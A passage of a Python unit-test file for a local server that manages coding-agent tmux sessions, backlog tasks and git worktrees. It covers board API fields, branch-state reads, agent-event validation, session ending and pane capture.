        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            status, body = self._get("/api/board")

        self.assertEqual(status, 200)
        self.assertEqual(len(body["projects"]), 1)
        self.assertEqual(len(body["projects"][0]["tasks"]), 4)

    def test_api_board_includes_capabilities_tmux_default_true(self):
        with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            status, body = self._get("/api/board")
        self.assertEqual(status, 200)
        self.assertEqual(body["capabilities"], {"tmux": True})

    def test_api_board_includes_capabilities_tmux_false_when_configured(self):
        self.config["capabilities"] = {"tmux": False}
        try:
            with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
                 mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
                status, body = self._get("/api/board?force=1")
        finally:
            del self.config["capabilities"]
        self.assertEqual(status, 200)
        self.assertEqual(body["capabilities"], {"tmux": False})

    def test_api_board_reports_the_version_captured_at_startup(self):
        # task-107: what a client is told is the value main() captured
        # when the process booted -- read back, never re-derived. A test
        # config never went through main(), so the fail-open default
        # (the bare constant) is what a bare config reports.
        self.config["version"] = "v9.9.9-1-gdeadbee"
        try:
            with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
                 mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")), \
                 mock.patch.object(server, "detect_version", side_effect=AssertionError(
                     "the board handler must not re-derive the version per request")):
                status, body = self._get("/api/board?force=1")
        finally:
            del self.config["version"]
        self.assertEqual(status, 200)
        self.assertEqual(body["version"], "v9.9.9-1-gdeadbee")

    def test_api_board_falls_back_to_the_constant_without_a_captured_version(self):
        with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            status, body = self._get("/api/board?force=1")
        self.assertEqual(status, 200)
        self.assertEqual(body["version"], f"v{version.__version__}")

    def test_api_board_reports_code_drift_derived_per_request(self):
        # task-128: the other half of the version above -- HEAD of this
        # checkout, read from git on THIS request and compared with the
        # commit the process booted from. Two requests, two answers: the
        # checkout moves between them and the second one says so.
        self.config["version"] = "v9.9.9-1-gdeadbee"
        heads = iter(["deadbee" + "0" * 33, "abc1234" + "0" * 33])

        def fake_git(args, cwd=None):
            if args == ["rev-parse", "HEAD"]:
                return git_proc(args, 0, next(heads) + "\n")
            if args[:2] == ["rev-list", "--count"]:
                return git_proc(args, 0, "3\n")
            return git_proc(args, 0, "")

        try:
            with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
                 mock.patch.object(server, "run_git", side_effect=fake_git), \
                 mock.patch.object(server, "which", return_value="/usr/bin/git"), \
                 mock.patch.object(server.os.path, "exists", return_value=True):
                status, first = self._get("/api/board")
                status2, second = self._get("/api/board")  # served from the board cache
        finally:
            del self.config["version"]
        self.assertEqual((status, status2), (200, 200))
        self.assertIsNone(first["codeDrift"])
        self.assertEqual(second["codeDrift"],
                         {"loaded": "deadbee", "current": "abc1234", "commitsBehind": 3})

    def test_api_board_code_drift_is_null_for_a_config_that_never_booted(self):
        with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            status, body = self._get("/api/board?force=1")
        self.assertEqual(status, 200)
        self.assertIn("codeDrift", body)
        self.assertIsNone(body["codeDrift"])

    def test_api_board_includes_harvest_mode_default_click(self):
        with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            status, body = self._get("/api/board?force=1")
        self.assertEqual(status, 200)
        self.assertEqual(body["harvestMode"], "click")

    def test_api_board_reflects_configured_harvest_mode(self):
        self.config["harvest"] = {"mode": "auto"}
        try:
            with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
                 mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
                status, body = self._get("/api/board?force=1")
        finally:
            del self.config["harvest"]
        self.assertEqual(status, 200)
        self.assertEqual(body["harvestMode"], "auto")

    def test_api_board_includes_refresh_interval_default_ten(self):
        with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            status, body = self._get("/api/board?force=1")
        self.assertEqual(status, 200)
        self.assertEqual(body["refreshIntervalSeconds"], 10)

    def test_api_board_reflects_configured_refresh_interval(self):
        self.config["refreshIntervalSeconds"] = 20
        try:
            with mock.patch.object(server, "run_backlog", return_value=load_fixture("my_app_list.json")), \
                 mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
                status, body = self._get("/api/board?force=1")
        finally:
            del self.config["refreshIntervalSeconds"]
        self.assertEqual(status, 200)
        self.assertEqual(body["refreshIntervalSeconds"], 20)

    def test_api_task_rejects_bad_task_id(self):
        status, body = self._get("/api/task?project=my-app&id=not-a-valid-id!!")
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_api_task_rejects_unknown_project(self):
        status, body = self._get("/api/task?project=doesnotexist&id=TASK-2")
        self.assertEqual(status, 404)
        self.assertIn("error", body)

    def test_api_task_passthrough_happy_path(self):
        my_app_view = load_fixture("my_app_view.json")

        with mock.patch.object(server, "run_backlog", return_value=my_app_view):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["id"], "TASK-2")

    def test_api_task_omits_branch_task_when_task_has_no_branch_at_all(self):
        # task-79: no Centrale worktree AND no task/<id> branch anywhere
        # -- the single cheap ref probe is the whole cost. No worktree
        # listing, no detached snapshot, no second backlog call.
        my_app_view = load_fixture("my_app_view.json")
        git_calls = []

        def fake_run_git(args, cwd=None, **kwargs):
            git_calls.append((list(args), cwd))
            return git_proc(args, 1, "", "")

        with mock.patch.object(server, "run_backlog", return_value=my_app_view) as run_backlog, \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch("os.path.isdir", return_value=False):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertNotIn("branchTask", body)
        self.assertEqual(
            git_calls,
            [(["rev-parse", "--verify", "--quiet", "refs/heads/task/task-2"], self.my_app_dir)],
        )
        self.assertEqual(run_backlog.call_count, 1)
        self.assertEqual(run_backlog.call_args.kwargs["cwd"], self.my_app_dir)

    def test_api_task_includes_branch_task_when_worktree_exists(self):
        # An agent's committed status/AC/notes updates only exist on its
        # own task/<id> branch until merged -- the main-checkout read and
        # the worktree read must be able to disagree, and both should
        # come through untouched.
        main_view = load_fixture("my_app_view.json")
        branch_view = json.loads(json.dumps(main_view))
        branch_view["task"]["status"] = "Done"
        branch_view["task"]["acceptanceCriteria"][0]["checked"] = True
        branch_view["task"]["implementationNotes"] = "Ran the campaign; results archived."
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-2")

        def fake_run_backlog(args, cwd):
            return branch_view if cwd == wt_dir else main_view

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git") as run_git, \
             mock.patch("os.path.isdir", return_value=True):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["status"], "In Progress")
        # An existing Centrale worktree short-circuits before any git
        # call at all -- task-79 added branch discovery, not cost.
        run_git.assert_not_called()
        self.assertIn("branchTask", body)
        self.assertEqual(body["branchTask"]["task"]["status"], "Done")
        self.assertEqual(body["branchTask"]["task"]["implementationNotes"], "Ran the campaign; results archived.")

    def test_api_task_omits_branch_task_when_worktree_backlog_read_fails(self):
        main_view = load_fixture("my_app_view.json")

        def fake_run_backlog(args, cwd):
            if cwd == self.my_app_dir:
                return main_view
            raise server.BacklogError("backlog CLI failed in worktree")

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch("os.path.isdir", return_value=True):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        # Best-effort: a broken worktree read doesn't fail the request,
        # it just means no "branchTask" -- the main-checkout view above
        # is still a perfectly good response on its own.
        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["id"], "TASK-2")
        self.assertNotIn("branchTask", body)

    def test_api_task_omits_branch_task_when_worktree_read_is_malformed(self):
        main_view = load_fixture("my_app_view.json")

        def fake_run_backlog(args, cwd):
            return main_view if cwd == self.my_app_dir else {"not": "the expected shape"}

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch("os.path.isdir", return_value=True):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertNotIn("branchTask", body)

    # -- task-79: branchTask from wherever the branch actually lives ----

    FOREIGN_CHECKOUT = "/repos/elsewhere/my-app-adopted"

    def _branch_view(self):
        """my_app_view.json as the branch itself has it: Done, AC checked,
        notes written -- none of which main can see until the merge."""
        branch_view = json.loads(json.dumps(load_fixture("my_app_view.json")))
        branch_view["task"]["status"] = "Done"
        branch_view["task"]["acceptanceCriteria"][0]["checked"] = True
        branch_view["task"]["implementationNotes"] = "Finished in the adopted checkout."
        return branch_view

    def _fake_git_for_branch(self, calls, checkouts_porcelain, add_returncode=0):
        """run_git stand-in for a task whose task/task-2 branch exists:
        the ref probe passes, `worktree list --porcelain` reports
        `checkouts_porcelain`, and any detached-snapshot add/remove pair
        is recorded (and can be made to fail)."""

        def fake_run_git(args, cwd=None, **kwargs):
            calls.append((list(args), cwd))
            if args[:2] == ["rev-parse", "--verify"]:
                return git_proc(args, 0, "cafe1234\n", "")
            if args[:2] == ["worktree", "list"]:
                return git_proc(args, 0, checkouts_porcelain, "")
            if args[:3] == ["worktree", "add", "--detach"]:
                if add_returncode:
                    return git_proc(args, add_returncode, "", "fatal: invalid reference")
                return git_proc(args, 0, "", "")
            if args[:2] == ["log", "-1"]:
                return git_proc(args, 0, "1756800000\n", "")
            return git_proc(args, 0, "", "")

        return fake_run_git

    def test_api_task_reads_branch_task_from_foreign_worktree(self):
        # task-79 AC #1: the branch was adopted into a checkout Centrale
        # doesn't manage (spawn.checkout_state kind "external", task-70).
        # The drawer used to show main's stale copy; now the read follows
        # the branch to that foreign path -- whose value comes from `git
        # worktree list --porcelain`, never from anything user-supplied.
        main_view = load_fixture("my_app_view.json")
        branch_view = self._branch_view()
        porcelain = (
            f"worktree {self.my_app_dir}\nHEAD cafe1234\nbranch refs/heads/main\n\n"
            f"worktree {self.FOREIGN_CHECKOUT}\nHEAD beef5678\n"
            "branch refs/heads/task/task-2\n\n"
        )
        git_calls = []

        def fake_run_backlog(args, cwd):
            return branch_view if cwd == self.FOREIGN_CHECKOUT else main_view

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog) as run_backlog, \
             mock.patch.object(server, "run_git", side_effect=self._fake_git_for_branch(git_calls, porcelain)), \
             mock.patch("os.path.isdir", return_value=False):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["status"], "In Progress")
        self.assertEqual(
            run_backlog.call_args.kwargs["cwd"], self.FOREIGN_CHECKOUT
        )
        self.assertEqual(
            run_backlog.call_args.args[0], ["task", "view", "TASK-2", "--json"]
        )
        self.assertEqual(body["branchTask"]["task"]["status"], "Done")
        self.assertTrue(body["branchTask"]["task"]["acceptanceCriteria"][0]["checked"])
        self.assertEqual(
            body["branchTask"]["task"]["implementationNotes"],
            "Finished in the adopted checkout.",
        )
        # Reading a foreign checkout is a plain working-tree read: no
        # snapshot worktree is created for it.
        self.assertFalse([args for args, _cwd in git_calls if args[:2] == ["worktree", "add"]])

    def test_api_task_omits_branch_task_when_foreign_checkout_read_fails(self):
        main_view = load_fixture("my_app_view.json")
        porcelain = (
            f"worktree {self.FOREIGN_CHECKOUT}\nHEAD beef5678\n"
            "branch refs/heads/task/task-2\n\n"
        )

        def fake_run_backlog(args, cwd):
            if cwd == self.my_app_dir:
                return main_view
            raise server.BacklogError("backlog CLI failed in the foreign checkout")

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=self._fake_git_for_branch([], porcelain)), \
             mock.patch("os.path.isdir", return_value=False):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["id"], "TASK-2")
        self.assertNotIn("branchTask", body)

    def test_api_task_reads_parked_branch_through_detached_snapshot(self):
        # task-79 AC #2: the branch is checked out nowhere at all. Its
        # committed state is read through the same detached snapshot
        # harvest's gate 2 uses -- detached, so the parked branch is
        # never reserved -- and the snapshot is removed on the way out.
        main_view = load_fixture("my_app_view.json")
        branch_view = self._branch_view()
        porcelain = f"worktree {self.my_app_dir}\nHEAD cafe1234\nbranch refs/heads/main\n\n"
        git_calls = []
        snapshot_cwds = []

        def fake_run_backlog(args, cwd):
            if cwd == self.my_app_dir:
                return main_view
            snapshot_cwds.append(cwd)
            return branch_view

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=self._fake_git_for_branch(git_calls, porcelain)), \
             mock.patch("os.path.isdir", return_value=False):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["status"], "In Progress")
        self.assertEqual(body["branchTask"]["task"]["status"], "Done")
        self.assertEqual(
            body["branchTask"]["task"]["implementationNotes"],
            "Finished in the adopted checkout.",
        )

        adds = [args for args, _cwd in git_calls if args[:3] == ["worktree", "add", "--detach"]]
        removes = [args for args, _cwd in git_calls if args[:2] == ["worktree", "remove"]]
        self.assertEqual(len(adds), 1)
        self.assertEqual(len(removes), 1)
        snapshot_dir = adds[0][3]
        self.assertEqual(adds[0], ["worktree", "add", "--detach", snapshot_dir, "task/task-2"])
        # Removed by path, forced, from the project repo -- so no stale
        # registration is left behind in .git/worktrees.
        self.assertEqual(removes[0], ["worktree", "remove", "--force", snapshot_dir])
        self.assertEqual(
            [cwd for args, cwd in git_calls if args[:2] == ["worktree", "remove"]],
            [self.my_app_dir],
        )
        self.assertLess(git_calls.index((adds[0], self.my_app_dir)),
                        git_calls.index((removes[0], self.my_app_dir)))
        self.assertEqual(snapshot_cwds, [snapshot_dir])
        self.assertNotEqual(snapshot_dir, self.my_app_dir)
        self.assertFalse(os.path.exists(snapshot_dir))

    def test_api_task_omits_branch_task_when_snapshot_cannot_be_created(self):
        # Best-effort to the end: a snapshot git refuses is a missing
        # field, not a failed request -- and the removal still runs.
        main_view = load_fixture("my_app_view.json")
        porcelain = f"worktree {self.my_app_dir}\nHEAD cafe1234\nbranch refs/heads/main\n\n"
        git_calls = []
        fake_git = self._fake_git_for_branch(git_calls, porcelain, add_returncode=128)

        with mock.patch.object(server, "run_backlog", return_value=main_view) as run_backlog, \
             mock.patch.object(server, "run_git", side_effect=fake_git), \
             mock.patch("os.path.isdir", return_value=False):
            status, body = self._get("/api/task?project=my-app&id=TASK-2")

        self.assertEqual(status, 200)
        self.assertEqual(body["task"]["id"], "TASK-2")
        self.assertNotIn("branchTask", body)
        self.assertEqual(run_backlog.call_count, 1)
        self.assertTrue([args for args, _cwd in git_calls if args[:2] == ["worktree", "remove"]])

    def test_api_sessions_no_server_running(self):
        proc = subprocess.CompletedProcess(["tmux"], 1, "", "no server running on /tmp/x")
        with mock.patch.object(server, "run_tmux", return_value=proc):
            status, body = self._get("/api/sessions")
        self.assertEqual(status, 200)
        self.assertEqual(body["sessions"], [])

    def test_api_sessions_filters_non_centrale(self):
        stdout = "centrale-my-app-task-9\t1690000000\t1\nrandom-other\t1690000001\t0\n"
        proc = subprocess.CompletedProcess(["tmux"], 0, stdout, "")
        with mock.patch.object(server, "run_tmux", return_value=proc):
            status, body = self._get("/api/sessions")
        self.assertEqual(status, 200)
        names = [s["name"] for s in body["sessions"]]
        self.assertEqual(names, ["centrale-my-app-task-9"])

    def test_api_sessions_includes_touched_files(self):
        stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        tmux_result = subprocess.CompletedProcess(["tmux"], 0, stdout, "")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["diff"]:
                return subprocess.CompletedProcess(["git", *args], 0, "server.py\n", "")
            return subprocess.CompletedProcess(["git", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", return_value=tmux_result), \
             mock.patch("os.path.isdir", return_value=True), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            status, body = self._get("/api/sessions")

        self.assertEqual(status, 200)
        self.assertEqual(len(body["sessions"]), 1)
        session = body["sessions"][0]
        self.assertEqual(session["project"], "my-app")
        self.assertEqual(session["files"], ["server.py"])
        self.assertEqual(session["filesTotal"], 1)

    def test_api_sessions_omits_files_when_worktree_gone(self):
        stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        tmux_result = subprocess.CompletedProcess(["tmux"], 0, stdout, "")
        with mock.patch.object(server, "run_tmux", return_value=tmux_result), \
             mock.patch("os.path.isdir", return_value=False):
            status, body = self._get("/api/sessions")
        self.assertEqual(status, 200)
        session = body["sessions"][0]
        self.assertNotIn("files", session)
        self.assertNotIn("filesTotal", session)

    def test_api_sessions_includes_agent_state_default_unknown(self):
        stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        tmux_result = subprocess.CompletedProcess(["tmux"], 0, stdout, "")
        with (
            mock.patch.object(server, "run_tmux", return_value=tmux_result),
            mock.patch("os.path.isdir", return_value=False),
        ):
            status, body = self._get("/api/sessions")
        self.assertEqual(status, 200)
        self.assertEqual(body["sessions"][0]["agentState"], "unknown")
        self.assertEqual(body["sessions"][0]["agentKind"], "unknown")

    def test_api_sessions_reflects_a_recorded_agent_state(self):
        # task-37: keyed by (project, taskId), never by tmux session name
        # -- the session name's task id is lowercase ("task-9"), the
        # recorded event's is uppercase, and they must still agree (see
        # AgentEventStoreTests.test_lookup_is_case_insensitive_on_task_id).
        server.record_agent_event("my-app", "TASK-9", "waiting")
        stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        tmux_result = subprocess.CompletedProcess(["tmux"], 0, stdout, "")
        with (
            mock.patch.object(server, "run_tmux", return_value=tmux_result),
            mock.patch("os.path.isdir", return_value=False),
        ):
            status, body = self._get("/api/sessions")
        self.assertEqual(status, 200)
        self.assertEqual(body["sessions"][0]["agentState"], "waiting")
        self.assertEqual(body["sessions"][0]["agentKind"], "unknown")

    def test_api_sessions_maps_codex_finished_to_idle_and_exposes_kind(self):
        server.record_agent_event("my-app", "TASK-9", "finished", agent_kind="codex")
        stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        tmux_result = subprocess.CompletedProcess(["tmux"], 0, stdout, "")
        with (
            mock.patch.object(server, "run_tmux", return_value=tmux_result),
            mock.patch("os.path.isdir", return_value=False),
        ):
            status, body = self._get("/api/sessions")
        self.assertEqual(status, 200)
        self.assertEqual(body["sessions"][0]["agentState"], "idle")
        self.assertEqual(body["sessions"][0]["agentKind"], "codex")

    def test_post_agent_event_maps_codex_finished_to_idle_and_records_kind(self):
        status, body = self._post(
            "/api/agent-event?project=my-app&task=TASK-2&agentKind=codex",
            json.dumps({"state": "finished"}).encode("utf-8"),
        )
        self.assertEqual(status, 200)
        self.assertEqual(body, {"ok": True})
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "idle")
        self.assertEqual(server.get_agent_kind("my-app", "TASK-2"), "codex")

    def test_post_agent_event_refuses_state_via_query_param(self):
        # task-99: the ?state= fallback is gone. It was the one way a
        # bodyless POST -- the exact shape a cross-origin HTML form
        # produces -- could drive this endpoint end to end.
        status, body = self._post("/api/agent-event?project=my-app&task=TASK-2&state=finished", b"")
        self.assertEqual(status, 400)
        self.assertIn("error", body)
        # "unknown" is get_agent_state's answer for a task it has never
        # recorded an event for -- i.e. nothing landed.
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")

    def test_post_agent_event_keeps_query_identity_with_a_json_body(self):
        # The deliberate exception (see _handle_agent_event's docstring):
        # identity stays in the query because CENTRALE_EVENT_URL is the
        # only carrier the notify hook has, and every already-running
        # session holds its URL in an environment that cannot change.
        # The body is still mandatory.
        status, body = self._post(
            "/api/agent-event?project=my-app&task=TASK-2",
            json.dumps({"state": "finished"}).encode("utf-8"),
        )
        self.assertEqual(status, 200)
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "finished")

    def test_post_agent_event_missing_project_returns_400(self):
        status, body = self._post(
            "/api/agent-event?task=TASK-2", json.dumps({"state": "working"}).encode("utf-8")
        )
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_agent_event_unknown_project_returns_404(self):
        status, body = self._post(
            "/api/agent-event?project=doesnotexist&task=TASK-2",
            json.dumps({"state": "working"}).encode("utf-8"),
        )
        self.assertEqual(status, 404)
        self.assertIn("error", body)

    def test_post_agent_event_invalid_task_id_returns_400(self):
        status, body = self._post(
            "/api/agent-event?project=my-app&task=not-a-valid-id!!",
            json.dumps({"state": "working"}).encode("utf-8"),
        )
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_agent_event_missing_task_id_returns_400(self):
        status, body = self._post(
            "/api/agent-event?project=my-app", json.dumps({"state": "working"}).encode("utf-8")
        )
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_agent_event_invalid_state_returns_400_and_does_not_record(self):
        status, body = self._post(
            "/api/agent-event?project=my-app&task=TASK-2",
            json.dumps({"state": "sleeping"}).encode("utf-8"),
        )
        self.assertEqual(status, 400)
        self.assertIn("error", body)
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")

    def test_post_agent_event_invalid_agent_kind_returns_400_and_does_not_record(self):
        status, body = self._post(
            "/api/agent-event?project=my-app&task=TASK-2&agentKind=other",
            json.dumps({"state": "working"}).encode("utf-8"),
        )
        self.assertEqual(status, 400)
        self.assertIn("invalid agent kind", body["error"])
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")

    def test_post_agent_event_missing_state_returns_400(self):
        status, body = self._post("/api/agent-event?project=my-app&task=TASK-2", b"")
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    # -- /api/end-session (task-38) --------------------------------------

    def test_post_end_session_kills_exact_session_and_returns_ok(self):
        list_stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        kill_calls = []

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, list_stdout, "")
            kill_calls.append(args)
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=fake_run_tmux):
            status, body = self._post_json("/api/end-session", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 200)
        self.assertEqual(body, {"ok": True, "session": "centrale-my-app-task-9"})
        # The leading "=" forces exact-name matching -- tmux -t otherwise
        # prefix-matches, which could kill an unrelated session.
        self.assertEqual(kill_calls, [["kill-session", "-t", "=centrale-my-app-task-9"]])

    def test_post_end_session_accepts_identity_via_json_body(self):
        list_stdout = "centrale-my-app-task-9\t1690000000\t1\n"
        kill_calls = []

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, list_stdout, "")
            kill_calls.append(args)
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=fake_run_tmux):
            status, body = self._post(
                "/api/end-session",
                json.dumps({"project": "my-app", "taskId": "TASK-9"}).encode("utf-8"),
            )

        self.assertEqual(status, 200)
        self.assertEqual(kill_calls, [["kill-session", "-t", "=centrale-my-app-task-9"]])

    def test_post_end_session_missing_project_returns_400(self):
        status, body = self._post_json("/api/end-session", {"taskId": "TASK-9"})
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_end_session_unknown_project_returns_404(self):
        status, body = self._post_json("/api/end-session", {"project": "doesnotexist", "taskId": "TASK-9"})
        self.assertEqual(status, 404)
        self.assertIn("error", body)

    def test_post_end_session_invalid_task_id_returns_400(self):
        status, body = self._post_json("/api/end-session", {"project": "my-app", "taskId": "not-a-valid-id!!"})
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_end_session_missing_task_id_returns_400(self):
        status, body = self._post_json("/api/end-session", {"project": "my-app"})
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_end_session_no_live_session_returns_404(self):
        with mock.patch.object(server, "run_tmux", return_value=subprocess.CompletedProcess(["tmux"], 0, "", "")):
            status, body = self._post_json("/api/end-session", {"project": "my-app", "taskId": "TASK-9"})
        self.assertEqual(status, 404)
        self.assertIn("no live session", body["error"])

    def test_post_end_session_does_not_kill_a_different_task_session_in_same_project(self):
        # Only an exact session-name match counts as "live" -- a session
        # for a different task in the same project must not satisfy the
        # liveness check or be killed.
        list_stdout = "centrale-my-app-task-2\t1690000000\t1\n"
        with mock.patch.object(server, "run_tmux", return_value=subprocess.CompletedProcess(["tmux"], 0, list_stdout, "")):
            status, body = self._post_json("/api/end-session", {"project": "my-app", "taskId": "TASK-9"})
        self.assertEqual(status, 404)

    def test_post_end_session_kills_dotted_subtask_session(self):
        # task-59: the live session for a dotted subtask id is actually
        # named with the tmux-safe "_" encoding -- end-session must
        # compute that same encoded name (via spawn.session_name) to
        # find and kill it, not the literal dotted string tmux would
        # reject as a -t target anyway.
        list_stdout = "centrale-my-app-task-11_2\t1690000000\t1\n"
        kill_calls = []

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, list_stdout, "")
            kill_calls.append(args)
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=fake_run_tmux):
            status, body = self._post_json("/api/end-session", {"project": "my-app", "taskId": "TASK-11.2"})

        self.assertEqual(status, 200)
        self.assertEqual(body, {"ok": True, "session": "centrale-my-app-task-11_2"})
        self.assertEqual(kill_calls, [["kill-session", "-t", "=centrale-my-app-task-11_2"]])

    def test_post_end_session_kill_failure_returns_500(self):
        list_stdout = "centrale-my-app-task-9\t1690000000\t1\n"

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, list_stdout, "")
            return subprocess.CompletedProcess(["tmux", *args], 1, "", "session not found")

        with mock.patch.object(server, "run_tmux", side_effect=fake_run_tmux):
            status, body = self._post_json("/api/end-session", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 500)
        self.assertIn("error", body)

    # -- /api/session-pane (task-60) -------------------------------------

    def _pane_run_tmux(self, stdout, calls, returncode=0, stderr=""):
        def fake(args):
            calls.append(list(args))
            return subprocess.CompletedProcess(["tmux", *args], returncode, stdout, stderr)
        return fake

    def test_get_session_pane_returns_rendered_lines_with_one_exact_capture_call(self):
        # A 24-row pane with three lines of real output: tmux pads the
        # visible screen with blank rows, which must not reach the client.
        stdout = "$ claude\nWorking on TASK-9...\n? Should I proceed (y/n)\n" + "\n" * 21
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._pane_run_tmux(stdout, calls)):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")

        self.assertEqual(status, 200)
        self.assertEqual(body["session"], "centrale-my-app-task-9")
        self.assertEqual(body["lines"], ["$ claude", "Working on TASK-9...", "? Should I proceed (y/n)"])
        self.assertEqual(body["lineCount"], 3)
        self.assertRegex(body["capturedAt"], r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$")
        # Exactly ONE tmux call per request -- no list-sessions preflight
        # (the drawer polls this every ~2s; with 10+ agents live this must
        # still cost one subprocess per tick) -- and the target's leading
        # "=" plus trailing ":" force an exact session-name match, so
        # task-1 can never resolve to task-10 (see capture_session_pane).
        self.assertEqual(calls, [["capture-pane", "-p", "-t", "=centrale-my-app-task-9:", "-S", "-40"]])

    def test_get_session_pane_resolves_dotted_subtask_id_via_task59_encoding(self):
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._pane_run_tmux("hi\n", calls)):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-11.2")
        self.assertEqual(status, 200)
        self.assertEqual(body["session"], "centrale-my-app-task-11_2")
        self.assertEqual(calls[0][3], "=centrale-my-app-task-11_2:")

    def test_get_session_pane_keeps_only_the_tail_and_honors_lines_param(self):
        stdout = "\n".join(f"line {i}" for i in range(1, 61)) + "\n"
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._pane_run_tmux(stdout, calls)):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9&lines=5")
        self.assertEqual(status, 200)
        self.assertEqual(body["lines"], ["line 56", "line 57", "line 58", "line 59", "line 60"])
        self.assertEqual(calls[0][-2:], ["-S", "-5"])

    def test_get_session_pane_clamps_lines_param(self):
        calls = []
        fake = self._pane_run_tmux("x\n", calls)
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            self._get("/api/session-pane?project=my-app&task=TASK-9&lines=99999")
            self._get("/api/session-pane?project=my-app&task=TASK-9&lines=0")
            self._get("/api/session-pane?project=my-app&task=TASK-9&lines=abc")
        self.assertEqual([c[-1] for c in calls], [f"-{server.MAX_SESSION_PANE_LINES}", "-1", "-40"])

    def test_get_session_pane_preserves_interior_blank_lines(self):
        stdout = "a\n\nb\n\n\n"
        with mock.patch.object(server, "run_tmux", side_effect=self._pane_run_tmux(stdout, [])):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")
        self.assertEqual(body["lines"], ["a", "", "b"])

    def test_get_session_pane_no_such_session_returns_404(self):
